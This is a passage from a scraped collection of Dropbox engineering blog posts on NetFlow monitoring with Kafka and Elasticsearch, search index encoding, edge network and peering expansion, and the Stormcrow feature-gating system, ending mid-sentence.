it’s collected, due to the nature of our data ingestion pipeline. That’s fine for long-term or historical data analysis, but makes real time monitoring impossible. To enable real-time queries, we built a solution in parallel with our existing data pipeline. Before we dive into the details, here’s a look at the architecture below: Dropbox collects NetFlow datagram records every day, from production backbone, edge, and data center routers. Each of these routers sends NetFlow datagrams to two different collectors which are distributed geographically. The copy serves as a backup to the original packet, just in case a collector fails. In the NetFlash system, the collectors now send the processed datagrams to two data pipelines: the HDFS/Hive clusters for permanent data storage, and the new Kafka/Elasticsearch cluster that gives us a near real-time view. Let’s drill down a bit further into the details of our data pipeline: We worked on three key components: the collector, the search backend, and the Kafka pipeline. The collector There are about six collectors at each data center, and each collector receives billions of log entries a day. So we optimized the performance of our collectors in a few ways. We chose high-performance servers with lots of RAM. The collector code is written in Go and designed to make use of multi-core processors. And we found that increasing the I/O buffer size is really helpful for reducing packet loss at the collectors. The raw datagrams themselves aren’t all that useful unless you can associate the IP addresses with meaningful information. The IP is the key to these other attributes, but with so many queries per second it is impossible to query the production database each time. So we built a local DB cache, where the IP is linked to machine, router, load balancer, and GeoIP attributes. The processors inside a collector annotate each raw diagram with a lookup to this local cache. After annotation, each data record contains server names, project names, server owners, roles, locations and more. Those attributes will be the index tokens on the search backend. We send these enriched logs to both the Hive and Elasticsearch pipelines. Kafka cluster As we tested the system, we observed that the ES cluster reduced its throughput when it was unhealthy, so we added a Kafka cluster as a buffer between the collectors and ES cluster to improve fault tolerance. Adding Kafka as an intermediate pipeline increased end to end latency but not by a perceptible amount. (Normally, the latency is on the order of <1 sec.) In return, Kafka’s durability guarantees that undelivered messages are kept for a certain period. This means that a recovered ES cluster can consume all unprocessed messages from Kafka. LogHub Once we added the Kafka cluster we needed a way to transfer the Kafka data to Elasticsearch. LogHub has the advantage of being a general solution that contains a Kafka consumer, an ES encoder and an ES connection pool. This gives us a lot of flexibility to adapt new Kafka topics into the Elasticsearch index. Elasticsearch cluster On the backend, our best solution for real-time document search is Elasticsearch(ES), but deploying it at scale proved to be the challenge. At first, we set up one master node and three data node clusters for prototyping. It crashed almost immediately under our data load! In order to clear this hurdle we’ve made many improvements: We expanded our cluster to three masters and ten data nodes. We send bulk requests to ES, with each request containing more than thirty logs, which reduces our ES I/O load. We only keep the last eight days indexed; expired data shards are deleted daily. We register ES data nodes into a NetFlash Zookeeper quorum, and use a connection pool to send logs to ES. The connections in the pool are re-used, and requests are evenly distributed among data nodes. We tuned indexing parameters to improve indexing performance, and we only ask ES to keep one copy of its indexed data, instead of three. We downsampled the logs by a factor of four at the collectors for our real-time pipeline, and keep everything on the permanent data store. What we learned We’re very happy with the current production setup for ES. The failure of data nodes are now invisible to internal users, and this configuration requires no extra effort or maintenance from us. The ES cluster was a bit fragile at first, so we deployed a few tricks to improve stability. We observed that ES masters could be too busy to re-allocate indexing shards among data nodes, causing some data nodes to lose their connections from the master. The masters would then attempt to re-allocate the lost shards from lost nodes to the rest of their live nodes, a cycle that would repeat until the entire cluster crashed. To solve this, we deployed more than twice as many data nodes as shards. So for 10 shards of indexed data, we’d allocate 22 nodes—two copies of each shard, and then two free nodes. If there are any node failures, there will always be an available node with a copy of the shard from the failed node that can replace it seamlessly. At the point of failure, the duplicate node replaces the failed node, the shard from this node is copied to one of the free nodes as a new backup, and then the failed node is released from the cluster. None of the other data nodes are affected by the failure. We upgraded ES to 2.0.0, and plan to use HDFS as an index backup in case the cluster enters a turbulent state. This will also give users the ability to search time period data without that eight day limit. Our small team wouldn’t have been able to complete this project without working together closely with the people using the system. Kibana’s query format is not the SQL-like format that network engineers are used to working with. Our partners in neteng facilitated adoption of the tool by saving the most useful queries, graphs, and dashboards for their teammates. To make the data relevant to the network engineers, they also re-indexed tokens so that the frequency of tokens is calculated as a bps (bit per second) rate for every 5 min., to match network terminologies. Results Thanks to these efforts, we can offer instantaneous access to our network data, complete with informative dashboards that show the traffic matrix at the cluster and metropolitan levels. The graphs at the beginning of this post are examples of how we monitor backbone flows for our block storage system , one of our largest traffic producers. We also leverage our NetFlow data stream to help us make intelligent business decisions. By watching the flow of data on our networks across the globe, our physical infrastructure team can more easily understand where to deploy new hardware where it’ll have the most impact. We can also see the markets that are potentially underserved, and begin planning expansions in ways that are efficient, and cost effective. Without our NetFlash pipeline, gathering this data takes a lot of time and effort. Now, this kind of intelligence is more readily available to decision makers at Dropbox. This means that capacity planning is always informed with a bird’s eye view of our network landscape, helping us deploy our resources effectively. The real-time aspect of our implementation isn’t required here, but the speed helps our production engineers and capacity planners get immediate answers to many of their questions. Knowing where our traffic spikes and when is also helpful for selecting other networks to establish peer relationships with. The monumental task of data migration is behind us, but NetFlash continues to help us monitor high-volume projects. What’s exciting now is to think about what else we can do with this pipeline in the future. Solving the scaling problems was the hard part—building new applications is easy. And one of the advantages of building tools at scale is the ability to adapt those tools for other purposes. We’re now using NetFlash to monitor ongoing operations, including marketing analytic logs, smart sensor data for analysis, and production operation logs. We can now adapt what we’ve built to collect, enrich, search, monitor, and analyze any kind of log data on our systems in real-time. // Tags Infrastructure Elasticsearch Traffic Netflow Monitoring // Copy link Link copied Link copied", "date": "2016-10-06"},
{"website": "Dropbox", "title": "Improving the performance of full-text search", "author": ["Adamfdropbox"], "link": "https://dropbox.tech/infrastructure/improving-the-performance-of-full-text-search", "abstract": "Problem Approach Search index encoding Results Lessons learned For Firefly, Dropbox's full-text search engine, speed has always been a priority. (For more background on Firefly, check out our blog post ). When our team saw search latency deteriorate from 250 ms to 1000 ms (95th percentile), we knew what to do—we measured, we analyzed, we fixed. Problem In order to create a good user experience for Firefly, we strive to keep our query latency under 250 ms (at 95th percentile). We noticed that our latency had deteriorated quite a bit since we started adding users to the system. Change in 95th percentile latency for Firefly backend One aspect of Firefly that allows us to support search over a very large corpus (hundreds of billions of documents) with a relatively small machine footprint is that we don’t load the search index in RAM — we serve it from solid-state drives (SSDs). In our investigation, we found that the deterioration in latency was caused by an increase in I/O operations per sec (IOPS) on the index servers. This increase caused the index servers to be I/O bound. Approach In Firefly, each document update mutates our inverted index . To reduce the I/O, we needed to reduce the amount of data read and written during an update to our index. This motivated us to take a closer look at the encoding we were using in our index. We started by instrumenting our code to collect more stats around I/O, then we implemented two different encoding schemes and looked at their impact on the I/O. Search index encoding Conceptually, a search index contains the mapping: Copy token => List(Tuple(DocumentID, attributes)) Examples of attributes are: whether the token appeared in the text of the document, if it was part of the filename, or if the token was an extension. For compactness, we encode the list of document IDs separately from the list of attributes. These are then laid out one after another: Copy token => Header, Encoded(List(DocumentID)), Encoded(List(attributes)) The header contains meta information like the byte length of each encoded part and the version of the encoding scheme used. This ended up being very helpful for this project, as it allowed us to introduce new ways of encoding this list without breaking backwards compatibility for old index entries. For example, if the token “JPG” is an extension for documents 10001, 10002 and 10005, and it appears in the text of document 10007, then the mapping for “JPG” would look like the following: Copy JPG => [10001, 10002, 10005, 10007], [Extension, Extension, Extension, FullText] In order to make the encoding more compact, we made two changes — we switched to using delta encoding for the list of document IDs, and using run-length encoding for the list of attributes. With delta encoding the list of Document IDs, the above posting list becomes: Copy JPG => [10001, 1, 3, 2], [Extension, Extension, Extension, FullText] We're using Varint encoding for the document IDs, so smaller values translate into fewer bytes in encoded form. When we use run-length encoding of attributes, we get an even more compact representation: Copy JPG => [10001, 1, 3, 2], [Extension x 3, FullText] Results These encoding changes reduced the total size of the encoded search index by 33%. size The above graph shows two large reductions in index size. The first one was a result of deploying delta encoding, and the second one was a result of deploying run-length encoding. Both of these greatly reduced the I/O we do on the index servers. This is illustrated by the following graph: io Interestingly, the run-length encoding resulted in a larger improvement than the delta length encoding. We had expected this to only reduce the posting-lists for certain filename tokens (e.g., “jpeg” was usually an extension) — these frequently had the same attributes associated with them. To our surprise, this also gave us a large reduction in the posting-list size for full-text tokens. Our theory is that some users may have the same word a single time in a large number of documents, so all of these hits share the same attributes. These changes resulted in a significant improvements in the 95th percentile latency of our system, as shown by the following graph—we're back at 250 milliseconds! Lessons learned It is important to track the vital stats of the system as it’s scaled up, and follow up on any degradation. Sometimes it may reveal unexpected behavior. Also, having extensible structures is pretty helpful — it would have been very hard to introduce alternative encodings without the use of the header in the mapping. As a result of these changes, our index servers were no longer I/O bound, leading to a better experience for our users. // Tags Infrastructure Search Engine Firefly // Copy link Link copied Link copied", "date": "2016-09-07"},
{"website": "Dropbox", "title": "Infrastructure Update: Pushing the edges of our global performance", "author": ["Akhil Gupta"], "link": "https://dropbox.tech/infrastructure/infrastructure-update-pushing-the-edges-of-our-global-performance", "abstract": "Dropbox has hundreds of millions of registered users, and we’re always hard at work to ensure our customers have a speedy, reliable experience, wherever they are. Today, I am excited to announce an expansion to our global infrastructure that will deliver faster transfer speeds and improved performance for our customers around the world. To give all of our users fast, reliable network performance, we’ve launched new Points of Presence (PoPs) across Europe, Asia, and parts of the US. We’ve coupled these PoPs with an open-peering policy , and as a result have seen consistent speed improvements. In fact, we’ve already doubled the transfer speeds for some Dropbox clients around the world. To upload a file to Dropbox, a user’s client needs to establish a secure connection with our servers. Before we launched these PoPs, a user that lives across the Pacific Ocean could expect this process to take as much as 450 milliseconds—half a second gone, and the client hasn’t even begun sending data. It can take up to 180 milliseconds for data traveling by undersea cables at nearly the speed of light to cross the Pacific Ocean. Data traveling across the Atlantic can take up to 90 milliseconds. This travel time is compounded by the way TCP works. To establish a reliable connection for uploads, the client initiates what’s called a slow start. It sends a few packets of data, then waits for an ACK (or acknowledgement), confirming that the data has been received. The client will then send a larger group of packets and await confirmation, repeating this process until ultimately transmitting data at the user’s full available link capacity. Given the limitations we encounter here—the distance across the Pacific Ocean, and the speed of light—there are only so many optimizations we can make before physics stands in the way. So we’ve established proxy servers at the network edge, giving us accelerators in California, Texas, Virginia, New York, Washington, the UK, the Netherlands, Germany, Japan, Singapore and Hong Kong. A user’s client connects to these edge proxies, completing the initial TLS and TCP handshakes quickly—the proxies have enough buffer space to let the client get through the slow start without having to wait for an ACK from our data centers. This gets that connection between clients and our data centers (via those edge proxy servers) started quickly. We also wanted to minimize the average Round Trip Time (RTT) per HTTPS request to our data centers. To do this, we connected our PoP to our data centers via our private Backbone links for increased stability and control, and also configured our proxies to keep the connections to our data centers alive. This helps us avoid the latency cost of opening a new connection when you want your data synced and start the transfer immediately. At the same time, we are committed to ensuring your data remains secure. We use TLS 1.2 and a PFS cipher suite at both our origin data centers and proxies. Additionally, we’ve enabled upstream certificate validation and certificate pinning on our proxy servers. This helps ensure that the edge proxy server knows it’s talking to our upstream server, and not someone attempting a man-in-the-middle attack. We’ve tested and applied this configuration in various markets in Europe and Asia. In France, for example, median download speeds are 40% faster after introducing proxy servers, while median upload speeds are approximately 90% faster. In Japan, median download speeds have doubled, while median upload speeds are three times as fast. As part of this expansion we also offer an open-peering policy, free of charge. Our open-peering agreements help us provide faster connections and improved network performance, to better serve local populations. With open-peering, major ISPs can route Dropbox traffic directly to and through our networks, improving transfer speeds for our users, and reducing bandwidth costs for Dropbox and our ISP partners. More than 400 ISPs are participating in the program globally, including BT in England, Hetzner Online in Germany and Vocus Communications in New Zealand, through their Orcon, Slingshot and Flip brands. Open-peering helps large companies like Google and LinkedIn manage their networks, and it’s helping Dropbox improve network performance too. Earlier this year we introduced Magic Pocket, our in-house multi-exabyte storage system. We’re now storing over 90% of our users’ data on this custom-built architecture, which allows us to customize the entire stack end-to-end and improve performance. We plan to continue this expansion in new regions over the next six to twelve months, and will continue to make infrastructure investments as the needs of our customers evolve and change. This expansion we’re announcing today is another part of that ongoing investment in our infrastructure, as we strive to offer the best possible experience for all of our users. // Tags Infrastructure Peering Pop // Copy link Link copied Link copied", "date": "2016-11-16"},
{"website": "Dropbox", "title": "Evolution of Dropbox’s Edge Network", "author": ["Raghav Bhargava"], "link": "https://dropbox.tech/infrastructure/evolution-of-dropboxs-edge-network", "abstract": "2014: A Brief History Dropbox Routing Architecture 2015: The year of planning, cleanups 2016: The year of expansion, optimization and peering Expanding across Europe and Asia Edge Proxy stack architecture Next-Gen routing architecture Standardizing & Optimizing IP transit architecture Expand Peering The Edge Network Today We’re hiring! Update (November 14, 2017): Miami, Sydney, Paris, Milan and Madrid have been added to the Dropbox Edge Network. Since launching Magic Pocket last year, we’ve been storing and serving more than 90 percent of our users’ data on our own custom-built infrastructure, which has helped us to be more efficient and improved performance for our users globally. But with about 75 percent of our users located outside of the United States, moving onto our own custom-built data center was just the first step in realizing these benefits. As our data centers grew, the rest of our network also expanded to serve our users — more than 500 million around the globe — at light-speed with a consistent level of reliability, whether they were in San Francisco or Singapore. To do that, we’ve built a network across 14 cities in seven countries on three continents. In doing so, we’ve added hundreds of gigabits of Internet connectivity with transit providers (regional and global ISPs), and hundreds of new peering partners (where we exchange traffic directly rather than through an ISP). We also designed a custom-built edge-proxy architecture into our network. The edge proxy is a stack of servers that act as the first gateway for TLS & TCP handshake for users and is deployed in PoPs (points of presence) to improve the performance for a user accessing Dropbox from any part of the globe. We evaluated some more standard offerings (CDNs and other “cloud” products) but for our specific needs this custom solution was best. Some users have seen and have increased sync speeds by as much as 300 percent, and performance has improved across the board. Dropbox Edge Network 2014 Dropbox Edge Network 2015 Dropbox Edge Network 2016 2014: A Brief History Going back to 2014, our network presence was only in the US. With two data center regions (one on each coast) storing all our user data, and five network PoPs in major cities across the country where we saw the most traffic. This meant that users across the globe could only be served from the US, we were heavily reliant on transit, and often higher latency paths across the Internet limited performance for international users. Each PoP was also connected to the local Internet Exchange in the facility where it was located, which enabled us to peer with multiple end-user networks also connected to the exchange. At this time we peered with only about 100 networks, and traffic was unevenly spread across our PoPs, with some seeing much more ingress and egress traffic than others over both Peering and Transit links. Because of this traffic pattern, we relied mostly on Transit from tier-1 providers to guarantee reliable and comprehensive connectivity to end users and allow a single point of contact during outages. Our edge capacity was in the hundreds of gigabits, nearly all of which was with our transit providers and shifting traffic between PoPs was a challenge. Dropbox Routing Architecture In 2014 we were using Border Gateway Protocol (BGP) at the edge of the network to connect with the transit and fabric peers in our network, and within the backbone to connect to the data centers. We used Open Shortest Path First (OSPF) as the underlying protocol for resolving Network Layer Reachability Information (NLRI) required by BGP within the Dropbox network. Within the routing policies, we were using extended-BGP-communities which are tagged to prefixes within the network as well as prefixes learned from peers like transit and fabric. We also use various path attributes in the BGP protocol suite that are used for selecting an egress path for a prefix if more than one path exists. Animation showing the evolution of our edge network from 2014 to 2015 2015: The year of planning, cleanups In early 2015, we overhauled our routing architecture, migrating from OSPF to IS-IS , changing our BGP communities, and implementing MPLS-TE to improve how we utilized our network backbone. The latter is an algorithm that provides an efficient way of forwarding traffic throughout the network, avoiding over-utilized and under-utilized links. This improved how our network handled dynamic changes in traffic flows between the growing number of network PoPs. More details on these changes will be covered in a future Backbone Blog. By mid-2015, we started thinking about how we could serve our users more efficiently, reduce round trip time and optimize the egress path from Dropbox to the end user. We were growing rapidly outside of the U.S., and started focusing our attention on the European market, specifically looking for locations where we could peer with more end user networks in the region. We selected three European PoPs which provided connectivity to the major peering exchanges and ambitiously expanded our peering edge in both North America and Europe. Our peering policy is open and can be referenced here: Dropbox Peering Policy . By the end of 2015, we added three new PoPs at Palo Alto, Dallas and New York, along with hundreds of gigabits of transit capacity, and we increased both the number of peer networks, and our traffic over peering connections substantially. Though we were still predominantly relying on our transit partners, our expanded peering footprint, geographically and in terms of capacity, allowed us to implement more extensive traffic engineering to improve user performance. It also laid the foundation for our new edge proxy design. 2016: The year of expansion, optimization and peering As we started 2016, we sharpened our focus on three key areas: Deploying new PoPs across Europe and Asia to get closer to the user and start improving the sync performance Designing and building the custom architecture that would enable faster network connections between our PoPs, including new edge proxy stack architecture, new routing architecture and standardized/optimized IP transit architecture Establishing new peering relationships to increase the peering footprint in our network Expanding across Europe and Asia Based on the data collected for traffic flows, and a variety of other considerations, we narrowed our focus to London, Frankfurt, and Amsterdam, which offer the maximum number of eye-ball networks for cities across Europe. These were successfully deployed in 2016 in a ring topology via the backbone and were connected back to the US through New York and Ashburn as port of entries in the US. At the same time, we saw an increase in our traffic volumes from Asia in 2016, so we started a similar exercise to what we did for Europe. We decided to expand Dropbox’s edge network across Asia in Tokyo, Singapore, Hong Kong in Q3-2016. These locations were selected to serve local as well as other eyeball networks that use Dropbox within the Asia-pacific region. Edge Proxy stack architecture Once we had our PoP locations in place, we built out the new architecture to accelerate our network transfers. The edge proxy stack handles user facing SSL termination and maintains connectivity to our backend servers throughout the Dropbox network. Edge proxy stack comprises of IPVS and NGINX machines. More details on proxy stack architecture will be covered in a future blog post. Next-Gen routing architecture Next-Gen routing architecture With the proxy stack in place, we turned our attention to routing. Our original strategy was to advertise all our public prefixes from every PoP. This made sense when our front-ends were consolidated in our data centers. With our proxy stack coming online and new PoPs being deployed we needed to change this to avoid asymmetric or sub-optimal routing. Doing so allows us to ensure users are served from from the PoP closest to them. Factors that we considered for new routing policy design were: Drive more effective utilization of network resources. Enable more predictable failure scenarios. Enable more accurate capacity planning. Minimize operational complexity. In the new design, we introduced the concept of “metro”, which meant breaking regions into individual metros. This design was validated based on Dropbox traffic flows and requirements. The idea behind a metro is: Users in close proximity of a metro should be routed to the closest PoP within the metro, rather than being served out of any other PoP, which cut down on latency and improved the user experience. Some metro’s will have multiple PoPs from redundancy perspective. A metro is a failure domain within itself i.e traffic can be shifted away from the metro as needed by withdrawing metro specific prefixes to the internet. Prefixes are contained within regions/metro and are only advertised out to the internet from that region/metro. To make intra vs inter-routing decisions more apparent. We also updated our BGP communities to support the new metro scope. Prefixes are now tagged with their Origin . Internally and externally learned routes are assigned the appropriate Route-Type . Prefix advertisements are limited (or summarized) to a Metro, Region, Continent, or Global as appropriate based on their Route-Scope . In addition we have defined a set of Actions which can be applied to a prefix which have internal meanings to the routers. The use of a Tag allows us to include other information (such as the community) with the prefix for special handling. Standardizing & Optimizing IP transit architecture Dropbox’s transit capacity until mid-2016 was more uneven and imbalanced than it is today. The IP transit ports in every metro had different capacity, so if we had to drain a metro, we wouldn’t necessarily be able to route traffic to the nearest PoP due to limited capacity. To fix this issue, we standardized the IP transit capacity across all the PoPs to ensure sufficient capacity is available in each PoP. Now, if a PoP goes down or if we have to do a Disaster Recovery Testing (DRT) exercise, we know that we will have enough capacity to move traffic between metros. Dropbox ingress traffic coming from the transit providers was also imbalanced. So we worked in collaboration with our tier-1 providers in implementing various solutions to fix the ingress imbalance into our ASN. We also re-designed our edge routing policies for IP transit so that a prefix now uses the shortest AS-PATH to exit our ASN between transit providers. If there is a tie between AS-PATH among multiple tier-1 transit providers, then one of the bgp attributes for path selection which is Multi-exit Discriminator ( MED ) would be used to break the tie. Expand Peering Up until Q1-2016 the majority of Dropbox traffic was egressing out via transit providers because our peering footprint was relatively small. We started identifying the top ASN’s behind transit providers in every metro and started collecting some data through netflow . By mid Q2, we had a list of certain ASNs (i.e., eye ball networks) with whom we could initiate some peering discussion. By the end of 2016, we shifted 30% of traffic to peering for better connectivity and to get closer to the user. Users across the globe saw significant performance improvements while accessing Dropbox. The Edge Network Today By executing the SSL handshake via our PoPs instead of sending them to our data centers, we’ve been able to significantly improve connection times and accelerate transfer speeds. We’ve tested and applied this configuration in various markets in Europe and Asia. For some users in Europe, for example, median download speeds are 40% faster after introducing edge proxy servers, while median upload speeds are approximately 90% faster. In Japan, median download speeds have doubled, while median upload speeds are three times as fast. The below graphs show major improvements in the TCP/SSL experience for users in Europe and Asia-pacific after the edge proxy stacks were deployed in every PoP within Dropbox. These graphs plot connect times for different countries (lower is better). Edge performance graph – Asia vs US and Europe Edge performance graph – Europe vs US We’ve also heard from several customers across Europe and Asia that their performance to Dropbox has significantly improved since we launched these PoPs. The below graph shows how latency dropped for one of these customers. Latency drop for a particular customer By the end of 2016, we had added six new PoPs across Europe and Asia, giving us a total of 14 PoPs and bringing our edge capacity into terabits. We added hundreds of additional gigs of transit, fabric, private peer capacity based on metro/regional traffic ratios and standardized transit footprint across the network. We also added 200+ unique ASN’s via peering. Today, the majority of our Internet traffic goes from a user’s best/closest PoP directly over peering, improving performance for our users and improving our network efficiency. We’re hiring! We’re on the lookout for experienced network engineers to help scale the Dropbox edge network beyond terabits of traffic and 100G uplinks. Or how about our backbone network where we’re constantly improving the reliability and performance of our CLOS-based fabrics. We also have a hybrid security/networking position for a Network Security Engineer in San Francisco. Want something more high level? The traffic team is also hiring both SWEs and SREs to work on TCP/IP packet processors and load balancers, HTTP/2 proxies, and our internal gRPC-based service mesh. Not your thing? We’re also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . // Tags Infrastructure Pops Proxy Stack Networking Edge Network // Copy link Link copied Link copied", "date": "2017-06-19"},
{"website": "Dropbox", "title": "Introducing Stormcrow", "author": ["Tom Mclaughlin"], "link": "https://dropbox.tech/infrastructure/introducing-stormcrow", "abstract": "Example How are populations defined? Hive-based populations: connecting to our analytics data warehouse Derived populations: building complex populations out of simpler ones Selector inferring: making the API easier to use by magically inferring additional information Deployment: web and internal infrastructure Deployment: desktop and mobile Monitoring Performance dangers Auditing challenges QA and Testing Conclusion A SaaS company like Dropbox needs to update our systems constantly, at all levels of the stack. When it comes time to tune some piece of infrastructure, roll out a new feature, or set up an A/B test, it’s important that we can make changes and have them hit production fast. Making a change to our code and then “simply” pushing it is not an option: completing a push to our web servers can take hours, and shipping a new mobile or desktop platform release takes even longer. In any case, a full code deployment can be dangerous because it could introduce new bugs: what we really want is a way to put some configurable “knobs” into our products, which a) give us the flexibility we need and b) can be safely tweaked in near real-time. To satisfy this need, we built a system called Stormcrow , which allows us to edit and deploy “feature gates.” A feature gate is a configurable code path that calls out to Stormcrow to determine how to proceed. Typical code usage looks like this: Copy # Here we are in some Dropbox Python code.\n# We need to decide whether to show a red button or a blue button to the user.\n# Let's ask Stormcrow!\nvariant = stormcrow.get_variant(\"feature_x\", user=the_user)\nif variant == \"RED_BUTTON\":\n  show_red_button()\nelif variant == \"BLUE_BUTTON\"\n  show_blue_button()\nelse:\n  show_default_button() Stormcrow feature gates Are rolled out to production within 10 minutes of being changed. Can be used across all Dropbox systems, from low-level infrastructure to product features on web, desktop or mobile. Provide advanced targeting capabilities, including the ability to segment users based on data in our analytics warehouse. Building a one-size-fits-all feature gating system like this is tricky, because it needs to be expressive enough to handle all the different use-cases we throw at it on a daily basis yet robust enough to handle Dropbox-scale traffic. The rest of this blog post will describe how the system works and some of our lessons from building it. Example Suppose we wanted to run an A/B test to see what button colors are preferred by German users. And further suppose we already know that English speakers prefer blue buttons. In the Stormcrow UI, we might configure the feature like this: This shows that “German locale users” will be exposed at a rate of 33% RED_BUTTON , 33% BLUE_BUTTON , and 34% CONTROL , and English sessions are set to 100% BLUE_BUTTON . But all other users will receive OFF . Notice that you can use heterogeneous population types in a given feature: the example uses both a “user” population and a “session” population—the former represents logged-in users only, while the latter represents any visit to our site. Stormcrow features are built using a sequence of populations which are matched using a fall-through system: first we try to match population 1, and if we fail we fall through to population 2, and so on. As soon as we match a population, we pick a variant to show the user according to the chosen variant mix for that population. It’s important to note that the variant assignment is stateless . It is randomized by hashing the user’s ID with a seed (the small gray box in the top right). Advanced Stormcrow users can even manipulate the seed to accomplish special behaviors. For example, if you want two different features to assign users the exact same way, you can give them the same seed. How are populations defined? To understand how populations work, we need two pieces of vocabulary: A selector is a code object that’s passed into Stormcrow in order to help it make decisions. We’ve made it so most commonly-used object models can also serve as Stormcrow selectors; for example, the user and session objects can both be used as selectors. A datafield is a piece of code that takes in one or more selectors and extracts a value of a specified type: either a boolean, a date, a number, a set, or a string. Datafields are then combined using a simple rule engine that allows you to perform boolean logic with them. Here’s an example of a real datafield, user_email , taken straight from the code: Copy @dataField(TYPE.STRING, [SELECTOR_NAMES.USER], \"The user's email as a string.\")\ndef user_email(**sel):\n    return _user(**sel) and _user(**sel).email The @dataField decorator specifies that this datafield requires a USER object, and will produce a STRING . It also includes a help string so we can make autogenerated documentation. The actual body of the function simply pulls the user’s email out of the object. Once a datafield is defined, you can use it in a population. Here’s a population which matches users at Gmail and Yahoo domains, except for a couple of excluded addresses, plus tomm@dropbox.com : Datafields are powerful since they can run arbitrary code in order to fetch a value. Dropbox has a lot of them to support all of our targeting use-cases, and new ones are being added all the time by different teams who need new capabilities. Hive-based populations: connecting to our analytics data warehouse Even with the ability to create arbitrary datafields, we face one limitation: we can only gate on information that’s accessible to our server code in some way, i.e., present in an already loaded model or in a database we can query efficiently. But there’s another big source of data at Dropbox: our Hive analytics warehouse . Sometimes a Dropboxer wants to select an arbitrary set of users by writing a HiveQL query, which can draw on all kinds of historical logging and analytics data. Defining a population in this way is an exercise in moving data around. In order for the population definition to be accessible to Stormcrow, we need to move it out of our analytics warehouse and into a scalable datastore that’s query-able from production code. To do this, we built a data pipeline that runs every day and exports the full set of Hive-based populations for that day into production. The main disadvantage of this kind of approach is data lag. Unlike a datafield, which always produces up-to-the-minute data, populations based on Hive exports only update on a daily basis. (And sometimes slower, if anything goes wrong with the pipeline.) While this is unacceptable for some kinds of gating, it works great for feature gates where populations change slowly. For example, a product launch to a predefined set of beta users is a good candidate for a Hive-based population. Hive-based populations represent a fundamental trade-off between expressive power and data freshness : performing feature gating on complex analytics data incurs more lag and data engineering work than gating on commonly accessed data. Derived populations: building complex populations out of simpler ones One of Stormcrow’s most powerful features is its ability to define populations not only in terms of rules or queries like above, but also in terms of other populations and features . We call these derived populations . For example, here’s a population that is only matched when a) we match the “Android devices” population and b) we receive variant OFF for the feature recents_web_comments. This capability solves the problem of complicated rule configurations being copied and pasted again and again throughout the tool. Instead, feature gating at Dropbox aims to build a core set of basic populations, which can be mixed and matched to produce arbitrarily complex targeting. We’ve found in practice that designing derived population hierarchies is very similar to refactoring code. In fact, you can look at derived populations as a way to replace coded “if” statements to choose between experiments. Rather than write logic of the form “if user is in Experiment A show them thing A, otherwise if they’re in not in Experiment A but are in Experiment B show them thing B…” you can express these relationships directly in the Stormcrow UI. Selector inferring: making the API easier to use by magically inferring additional information Like any complicated software system, Dropbox has a number of internal models used in our code. For example, the user model represents a single user account, and the team model represents a Dropbox Business team. The identity model is how we represent paired accounts: it ties together a personal plus a business user model into a single object. All of our models are connected via various one-to-many and many-to-one relationships. In Dropbox product code, we typically have access to one or more of these models. For developer convenience, it’s nice if Stormcrow understands our model relationships well enough to “infer” extra selectors automatically. For example, a developer may have access to a user object u and want to query some feature which is gated on team information. While they could write Copy variant = stormcrow.get_variant(\"team_related_feature\", user=u, team=u.get_team()) it is much more convenient if Stormcrow can fill in the details automatically, so the developer only needs to write Copy variant = stormcrow.get_variant(\"team_related_feature\", user=u) In Stormcrow we represent Dropbox’s model relationships as a graph which we call the selector inferring graph . In this graph, each node is a model type, and an edge from node A to node B means that we can infer model B from model A. When a Stormcrow call happens, the first thing we do is take the selectors we were given and compute their transitive closure in this graph. Of course, inferring may introduce a performance cost in the form of extra computation or network calls. To make it more efficient, inferring produces thunks , which are lazily evaluated so that we only compute them if a selector is actually needed to make a gating decision. (See the “Performance dangers” section below for more on the risks of Stormcrow making network calls.) Here’s our actual selector inferring graph. Each node represents a selector type that Stormcrow knows about. For example, we can see that viewer is a very handy model to have, because we can use it to infer session , team , user , and identity . In addition, the special node (none) represents selectors that can be auto-inferred from “thin air”: for example, the session is always auto-inferred in our server code, so there’s no need to pass any selectors to use it. We’ve found selector inferring to be a big win for developer convenience, while at the same time being easy to understand. We also have tooling to check that developers don’t make mistakes with which selectors they pass in; see the \"Auditing challenges” section. Deployment: web and internal infrastructure If you have a large fleet of production servers, how should the feature gating configuration be deployed to them? Keeping feature gating information in a database is the obvious answer, but then you need a network call to retrieve it. Given that there may be a large number of feature gates evaluated on a typical page load on dropbox.com , this can result in a huge numbers of configuration fetches against the database. Even if you mitigate these problems with a carefully designed caching system (using local caching + memcached , for example), the database becomes a single point of failure for the system. Instead, we deploy a JSON file called stormcrow_config.json to all of our production servers. This deployment simply uses our internal push system and is pushed every time a change is made to Stormcrow configuration. All of our servers run a background thread called the “Stormcrow loader” which constantly watches the stormcrow_config.json copy on disk, reloading it when it changes. This allows Stormcrow to reload without interruption to the server. If the configuration file is not found for some reason, Stormcrow has the ability to fall back to direct database access—but this is highly frowned upon for any system that might produce nontrivial amounts of traffic. Deployment: desktop and mobile Feature gating on the desktop and mobile platforms is a little different. For these clients, it makes more sense for them to batch request feature and variant information. When they request Stormcrow information from our backend, they receive information like the following: Copy {\r\n  \"feature_a\": \"VARIANT_X\",\r\n  \"feature_b\": \"OFF\",\r\n  \"feature_c\": \"CONTROL\",\r\n  ...\r\n} Clients on both kinds of platforms also pass up one or more special selectors containing platform-specific information. Mobile clients pass up a selector providing information on the app being used and on the device itself, and desktop clients pass up a selector with information on the desktop host. As with other selectors, Stormcrow has datafields that can be used to write rules based on these characteristics. Monitoring Every Stormcrow feature assignment and exposure is logged to our real-time monitoring system, Vortex. The Stormcrow UI has embedded graphs in it, where users can track the rate of assignments and exposures. For example, the graph below shows three different variants (yellow, blue, and green) and how many users have been exposed to each variant over time. These graphs are also annotated with a vertical line for every time a feature (or a population that the feature depends on) is edited. This allows us to easily see how our edits affect the rates at which different variants are assigned. In this graph, for instance, we can see that the rates of the green and blue variants converged after the first edit (vertical line), and the yellow variant went up. Interestingly, we can also see usage effects not caused by Stormcrow changes, such as the gradual increase of the yellow variant in the middle of the graph. Users can also click the links at the bottom to drill into the data in more detail, using our in-house tool Vortex or other data exploration tools. Performance dangers Because of Stormcrow’s modular datafield design, it’s possible for people at Dropbox to write datafields that are not performant. Often this is done with the best of intentions: someone creates a new datafield which is perfectly safe for their small use-case, but could be used by someone else to send huge amounts of traffic toward a fragile system. This has taught us an important lesson: avoid database calls or other I/O in the feature gating system! Instead, one should pass as much information into the system from the caller as possible. This puts the performance onus on the caller, and makes I/O more predictable: if the caller always does the I/O no matter what, then a Stormcrow edit can’t change the performance characteristics of the code. In an 